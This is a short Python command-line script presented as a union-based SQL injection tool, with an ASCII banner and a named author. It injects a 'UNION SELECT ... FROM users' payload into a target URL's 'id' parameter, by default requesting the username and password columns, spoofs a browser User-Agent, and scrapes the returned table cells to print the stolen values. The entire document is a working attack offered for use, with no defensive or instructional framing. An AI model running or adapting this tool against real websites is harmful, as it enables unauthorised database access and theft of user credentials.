import requests
import re
import argparse

# Define the logo
logo = r"""
   _____                _             
  / ____|             | |            
 | |  __  __ _ _ __ __| | ___ _ __   
 | | |_ |/ _` | '__/ _` |/ _ \ '_ \  
 | |__| | (_| | | | (_| |  __/ | | | 
  \_____|\\__,_|_| \__,_|\___|_| |_| 
                                      
          Union-Based SQL Injection Tool
          Version: 1.0
          Author: G4UR4V007
"""

# Print the logo
print(logo)

# Define the parser
parser = argparse.ArgumentParser(description='Union-Based SQL Injection Tool')
parser.add_argument('-u', '--url', help='Specify the URL', required=True)
parser.add_argument('-c', '--columns', help='Specify the columns to extract (comma-separated)', default='username,password')
args = parser.parse_args()

# Define the injection point
injection_point = "id"

# Define the SQL injection payload
payload = " UNION SELECT {} FROM users -- -".format(args.columns)

# Define the headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

# Send the request with the injection payload
response = requests.get(args.url.replace(injection_point, injection_point + payload), headers=headers)

# Extract the data from the response
data = re.findall(r"<td>(.*?)</td>", response.text)

# Print the extracted data
columns = args.columns.split(',')
for i, column in enumerate(columns):
    print("{}: {}".format(column, data[i]))
